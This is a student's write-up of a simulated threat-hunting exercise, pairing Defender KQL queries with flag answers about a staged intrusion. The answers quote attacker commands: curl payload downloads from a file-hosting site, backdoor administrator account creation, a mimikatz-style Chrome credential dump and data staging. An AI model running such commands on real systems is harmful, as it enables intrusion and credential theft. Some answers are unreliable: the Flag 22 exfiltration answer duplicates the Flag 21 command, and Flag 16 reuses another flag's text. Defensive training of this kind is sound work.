# Threat Hunt Report 

* Azuki Import/Export - 梓貿易株式会社
* Analyst: Alexis Annor-Larbi
* Platform: Microsoft Defender for Endpoint (MDE)
* Tools: KQL, Defender Tables, Endpoint Telemetry
* Date: Januray 15, 2026

## Executive Summary
This threat hunt report presents the results of an exercise that simulates a threat hunt. In this simultated hunt, we must find and capture flags using the provided context. 

## Table of Contents
1. Incident Summary
2. Flag-by-Flag Breakdown
3. Conclusion and Lessons Learned

## Incident Summary
A couple of days after a file server breach on the affected system, the same attackers decided to strike back with more efficient and stronger techniques. This time, it appears that the CEO's administrative personal computer has been the one to be affected. We know that the attacks started on November 24 2025.

## Flag-by-Flag Breakdown with Queries

<h2>🚩 FLAG 1: LATERAL MOVEMENT - Source System</h2>

Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.
KQL query:
//Starting Point: Nov-24
//FLAG 1
DeviceLogonEvents
| where DeviceName contains "azuki"
|project ActionType, LogonType, AccountDomain, AccountName, RemoteIP, RemoteIPType, Timestamp
<p>
<img src="https://i.imgur.com/3Xf1MDT.png"
</p>
<p>
For this first flag, we already have a good starting point for where to search, all we need to do is find the IP.
</p>
<br />
Question: Identify the source IP address for lateral movement to the admin PC? 
Answer: 10.1.0.204

<h2>🚩 FLAG 2: LATERAL MOVEMENT - Compromised Credentials</h2>

Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities.
KQL query:
//FLAG 2
DeviceLogonEvents
| where DeviceName contains "azuki"
|where RemoteIP contains "204"
|project  AccountName, RemoteIP, RemoteIPType, Timestamp

<p>
<img src="https://i.imgur.com/eSW6SiK.png"
</p>
<p>
For this flag, we already know the IP of the attacker, all we need to do is filter for their "AccountName".
</p>
<br />
Question: Identify the compromised account used for lateral movement?
Answer: yuki.tanaka

<h2>🚩 FLAG 3: LATERAL MOVEMENT - Target Device</h2>

Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.
KQL query:
//FLAG 3 
DeviceLogonEvents
| where DeviceName contains "azuki"
|project ActionType, LogonType, AccountDomain, RemoteIP, RemoteIPType

<p>
<img src="https://i.imgur.com/eskHbB4.png"
</p>
<p>
Similarly to the previous flag, we simply need to filter for the "DeviceName".
</p>
<br />
Question: What is the target device name? 
Answer: azuki-adminpc

<h2>🚩 FLAG 4: LATERAL MOVEMENT - Target Device</h2>

Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.
KQL query:
//FLAG 4
DeviceNetworkEvents
| where DeviceName contains "azuki"
|where ActionType contains "succ"
|project  TimeGenerated, ActionType, DeviceName, RemoteUrl

<p>
<img src="https://i.imgur.com/PQHouW3.png"
</p>
<p>
Next, we need to find where the malware was stored.
</p>
<br />

Question: What file hosting service was used to stage malware?
Answer: litter.catbox.moe

<h2>🚩 FLAG 5: EXECUTION - Malware Download Command</h2>

Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

KQL query:
//FLAG 5
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "litter"
|project ProcessCommandLine

<p>
<img src="https://i.imgur.com/wePPUWa.png"
</p>
<p>
Using the information we obtained from the previous flag, we can narrow our query results by using the file hosting service's name as a guide.
</p>
<br />

Question: What command was used to download the malicious archive? 
Answer: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z


<h2>🚩 FLAG 6: LATERAL MOVEMENT - Target Device</h2>

EXECUTION - Archive Extraction Command
Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

KQL query:
//FLAG 6
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "KB5044273"

<p>
<img src="https://i.imgur.com/BQ0GQxC.png"
</p>
<p>
Using the information obtained in the previous flag, we can figure out how the attackers obtained the archive. We now know that the .zip extractor "7Zip" was used for this task.
</p>
<br />
Question: Identify the command used to extract the password-protected archive? 
Answer: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y


<h2>🚩 FLAG 7: LATERAL MOVEMENT - Target Device</h2>

EXECUTION - Archive Extraction Command
Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

KQL query:
//FLAG 7
DeviceEvents
|where DeviceName contains "azuki"
|where ActionType contains "named"
|where InitiatingProcessAccountName contains "yu"
|where TimeGenerated between (todatetime('2025-11-25T04:24:34.3155634Z') .. todatetime('2025-11-25T06:24:34.3155634Z') )
|project InitiatingProcessCommandLine

<p>
<img src="https://i.imgur.com/bkiLynd.png"
</p>
<p>
For this flag, we needed to find out the targeted filename.
</p>
<br />
Question: Identify the C2 beacon filename? 
Answer: meterpreter.exe

<h2>🚩 8: PERSISTENCE - Named Pipe</h2>

Named pipes enable inter-process communication for C2 frameworks. Pipes follow distinctive naming patterns that serve as behavioural indicators.

KQL query:
//FLAG 8
DeviceEvents
|where DeviceName contains "azuki"
|where ActionType contains "named"
|where InitiatingProcessFileName contains "meter"
|where TimeGenerated between (todatetime('2025-11-24T04:24:34.3155634Z') .. todatetime('2025-11-27T06:24:34.3155634Z') )

<p>
<img src="https://i.imgur.com/vKJtcCW.png"
</p>
<p>
Using previous info, we should be able to find out the name of the pipe created by the C2 implant.
</p>
<br />
Question: Identify the named pipe created by the C2 implant?
Answer: \Device\NamedPipe\msf-pipe-5902

<h2>🚩 9: CREDENTIAL ACCESS - Decoded Account Creation</h2>

Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

KQL query:
//FLAG 9
DeviceProcessEvents
|where DeviceName contains "azuki-admin"
|where ProcessCommandLine contains "Powershell"
|sort by Timestamp asc 
|where ProcessVersionInfoFileDescription contains "powershell"
| where ProcessCommandLine has_any("-encodedcommand", "-enc", "-e")
| extend b64 = extract("([A-Za-z0-9+/]{30,}[=]{0,2})", 1, ProcessCommandLine)
| where isnotempty(b64)
| extend DecodedCommand = base64_decode_tostring(b64)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, DecodedCommand

<p>
<img src="https://i.imgur.com/qjlYqe7.png"
</p>
<p>
We are then presented with a base64 file that we must decipher. Once deciphered, we will obtain a command.
</p>
<br />
Question: What is the decoded Base64 command?
Answer: net user yuki.tanaka2 B@ckd00r2024! /add

<h2>🚩 10: PERSISTENCE - Backdoor Account</h2>

Hidden administrator accounts provide alternative access if primary persistence mechanisms are discovered and removed.
KQL query:
//FLAG 10
DeviceProcessEvents
|where DeviceName contains "azuki-admin"
|where ProcessCommandLine contains "Powershell"
|sort by Timestamp asc 
|where ProcessVersionInfoFileDescription contains "powershell"
| where ProcessCommandLine has_any("-encodedcommand", "-enc", "-e")
| extend b64 = extract("([A-Za-z0-9+/]{30,}[=]{0,2})", 1, ProcessCommandLine)
| where isnotempty(b64)
| extend DecodedCommand = base64_decode_tostring(b64)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, DecodedCommand

<p>
<img src="https://i.imgur.com/d0g9pI5.png"
</p>
<p>
Once we obtain the decoded command, we can examine it further. We notice that the command creates a new user account that can be used as a backdoor.
</p>
<br />
Question: Identify the backdoor account name?
Answer: yuki.tanaka2

<h2>🚩 11: PERSISTENCE - Decoded Privilege Escalation Command</h2>

Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.
KQL query:
//FLAG 11
DeviceProcessEvents
|where DeviceName contains "azuki-admin"
|where ProcessCommandLine contains "Powershell"
|sort by Timestamp asc 
|where ProcessVersionInfoFileDescription contains "powershell"
| where ProcessCommandLine has_any("-encodedcommand", "-enc", "-e")
| extend b64 = extract("([A-Za-z0-9+/]{30,}[=]{0,2})", 1, ProcessCommandLine)
| where isnotempty(b64)
| extend DecodedCommand = base64_decode_tostring(b64)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, DecodedCommand

<p>
<img src="https://i.imgur.com/pDqTZRI.png"
</p>
<p>
From there, we can also notice that the same user created for backdoor purposes is also being added to a group.
</p>
<br />
Question: What is the decoded Base64 command for privilege escalation?
Answer: net localgroup Administrators yuki.tanaka2 /add

<h2>🚩 12: DISCOVERY - Session Enumeration</h2>

Terminal services enumeration reveals active user sessions, helping attackers identify high-value targets and avoid detection.
KQL query:
//FLAG 12
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "qwinsta"
|order by Timestamp asc 

<p>
<img src="https://i.imgur.com/maIQ0gJ.png"
</p>
<p>
Following this, to find the command that was used to enumerate RDP sessions, we simply search for common keywords associated with RDP enumeration.
</p>
<br />
What command was used to enumerate RDP sessions?
Answer: qwinsta.exe

<h2>🚩 FLAG 13: DISCOVERY - Domain Trust Enumeration</h2>

Domain trust relationships reveal paths for lateral movement across organisational boundaries and potential targets in connected forests.
KQL query:
//FLAG 13
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "domain"
|project ProcessCommandLine

<p>
<img src="https://i.imgur.com/0tONSFZ.png"
</p>
<p>
Similarly to the previous flag, we must try to find common commands used to enumerate domains. We can filter in a more precise manner by finding command lines with the word "domain"
</p>
<br />
Identify the command used to enumerate domain trusts?
Answer: "nltest.exe" /domain_trusts /all_trusts


<h2>🚩 FLAG 14: DISCOVERY - Network Connection Enumeration</h2>

Network connection enumeration identifies active sessions, listening services, and potential lateral movement targets.
KQL query:
//FLAG 14
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "net"
|where ProcessVersionInfoFileDescription contains "net"

<p>
<img src="https://i.imgur.com/oWC8boO.png"
</p>
<p>
Similarly to the previous two flags, we simply need to filter for the commonly used terms used for network enumeration.
</p>
<br />
Question: What command was used to enumerate network connections?
Answer: "NETSTAT.EXE" -ano


<h2>🚩 FLAG 15: DISCOVERY - Password Database Search</h2>

Password management databases contain credentials for multiple systems, making them high-priority targets for credential theft.
KQL query:
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "where"
|project ProcessCommandLine

<p>
<img src="https://i.imgur.com/M1VDx9o.png"
</p>
<p>
Next, we need to find out where the password is coming from. Usually, attackers use distinct commands in order to get results. In this case, the command "where" has been used.
</p>
<br />
Question: What command was used to search for password databases?
Answer: where  /r C:\Users *.kdbx

<h2>🚩 FLAG 16: DISCOVERY - Credential File</h2>

Plaintext password files represent critical security failures and provide attackers with immediate access to multiple systems.
KQL query:
DeviceFileEvents
| where DeviceName contains "azuki"
|where FileName contains "lnk"

<p>
<img src="https://i.imgur.com/eskHbB4.png"
</p>
<p>
Similarly to the previous flag, we simply need to filter for the "DeviceName".
</p>
<br />

Answer: OLD-Passwords.txt


<h2>🚩 FLAG 17: COLLECTION - Data Staging Directory</h2>

Attackers establish staging locations in system directories to organise stolen data before exfiltration. These paths are critical IOCs for forensic investigation.
KQL query:
DeviceFileEvents
| where DeviceName contains "azuki-admin"
|where ActionType contains "FileCreated"
|order by Timestamp asc 
|where InitiatingProcessCommandLine contains "txt"

<p>
<img src="https://i.imgur.com/kGPr3tU.png"
</p>
<p>
Now, we need to find out the exact location of the password by the folder path. We can filter out unneeded results by searching for command lines that have "txt" in it.
</p>
<br />
Identify the data staging directory?
Answer: C:\ProgramData\Microsoft\Crypto\staging


<h2>🚩 FLAG 18: COLLECTION - Automated Data Collection Command</h2>

Scriptable file copying technique with retry logic and network optimisation is ideal for bulk data theft operations
KQL query:
//FLAG 18
DeviceFileEvents
| where DeviceName contains "azuki-ad"
|where FolderPath contains "crypto"


<p>
<img src="https://i.imgur.com/1EcpyCp.png"
</p>
<p>
Using the the previous flag as a base, we can simply filter out for the file copying technique easily as we simply need to use the name of the folder found as part of the query. In this particular hunt, the attacker has used the "robocopy" command.
</p>
<br />
Question: Identify the command used to copy banking documents
Answer: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP


<h2>🚩 FLAG 19: COLLECTION - Exfiltration Volume</h2>

Quantifying the number of archives created reveals the scope of data theft and helps prioritise impact assessment efforts.
KQL query:
//FLAG 19
DeviceProcessEvents
|where DeviceName contains "azuki"
| where FileName in~ ("certutil.exe", "bitsadmin.exe", "curl.exe", "wget.exe")
| where ProcessCommandLine has_any ("http", "https", "/transfer", "-urlcache")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessAccountName

<p>
<img src="https://i.imgur.com/vCMFv6e.png"
</p>
<p>
Straightforward flag, we simply need to count the relevant entries to find the sum total.
</p>
<br />
Question: Identify the total number of archives created?
Answer: 8


<h2>🚩 FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download</h2>

Attackers download specialised credential theft tools directly to compromised systems, adapting their toolkit to the target environment.
KQL query:
//FLAG 20
DeviceProcessEvents
|where DeviceName contains "azuki"
|where ProcessCommandLine contains "litter.cat"
|project ProcessCommandLine

<p>
<img src="https://i.imgur.com/ujWi97J.png"
</p>
<p>
To find this flag, we can use the name of the file hosting service to help filter out results.
</p>
<br />
Question: What command was used to download the credential theft tool?
Answer: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z


<h2>🚩 FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft</h2>

Modern credential theft targets browser password stores, extracting saved credentials without triggering LSASS-focused detections.
KQL query:
//FLAG 21
DeviceProcessEvents
|where DeviceName contains "azuki"
|where AccountName contains "yuki"
|where ProcessCommandLine has_any ("Chrome", "Fire")

<p>
<img src="https://i.imgur.com/aCtdIEp.png"
</p>
<p>
To find this flag, we can filter for popular web browswers such as "Google Chrome" or "Mozilla Firefox". In this case the attacker used Google Chrome.
</p>
<br />
Question: What command was used for browser credential theft?
Answer: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit


<h2>🚩 FLAG 22: EXFILTRATION - Data Upload Command</h2>

Form-based HTTP uploads provide simple, reliable data exfiltration that blends with legitimate web traffic and supports large file transfers.
KQL query:
//FLAG 22
DeviceProcessEvents
|where DeviceName contains "azuki"
|where AccountName contains "yuki"
|where ProcessCommandLine has_any ("Chrome", "Fire")

<p>
<img src="https://i.imgur.com/4DeAo5h.png"
</p>
<p>
To find this flag, we can use a similar query to the previous one.
</p>
<br />
Question: Identify the command used to exfiltrate the first archive?
Answer: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit


<h2>🚩 FLAG 23: EXFILTRATION - Cloud Storage Service</h2>

Anonymous file sharing services provide temporary storage with self-destructing links, complicating data recovery and attribution.
KQL query:
//FLAG 23
DeviceProcessEvents
|where DeviceName contains "azuki"
|where ProcessCommandLine has_any ("chrome", "curl")
|where FileName contains "curl"

<p>
<img src="https://i.imgur.com/dGOuLCt.png"
</p>
<p>
To find the exfiltration service domain, we can once again use previous queries to facilate things. From there, it is a simple matter to inspect relevant entries.
</p>
<br />
Question: Identify the exfiltration service domain?
Answer: gofile.io


<h2>🚩 FLAG 24: EXFILTRATION - Destination Server</h2>

IP addresses enable network-layer blocking and threat intelligence correlation when domain-based controls fail or are bypassed.
KQL query:
//FLAG 24
DeviceNetworkEvents
| where DeviceName contains "azuki"
|project ActionType, RemoteIP, Timestamp, DeviceName,RemoteUrl
|where RemoteUrl contains "gofile"

<p>
<img src="https://i.imgur.com/I7QMidJ.png"
</p>
<p>
Using what we know from the previous flags, we can use the exfiltration service domain as a guide to filter out irrelevant results.
</p>
<br />
Identify the exfiltration server IP address?
Answer: 45.112.123.227


<h2>🚩 FLAG 25: CREDENTIAL ACCESS - Master Password Extraction</h2>

Password managers store credentials for multiple systems. Extracting the master password provides access to all stored secrets.
KQL query:
//FLAG 25
DeviceProcessEvents
| where DeviceName contains "azuki"
|where ProcessCommandLine contains "txt"
|project ProcessCommandLine

<p>
<img src="https://i.imgur.com/eskHbB4.png"
</p>
<p>
For this final flag, we can speed things up by only filtering out for ".txt" created files.
</p>
<br />

Question: What file contains the extracted master password?
Answer: KeePass-Master-Password.txt



## Conclusion & Lessons Learned
Overall, this threat hunt simulation has permited me to gain quite the insight as to how one must think when looking for flags. This exercise has opened my eyes to the world of Cybersecurity as whole. Furthermore, this hunt allowed me to think like a Cybersecurity analyst.
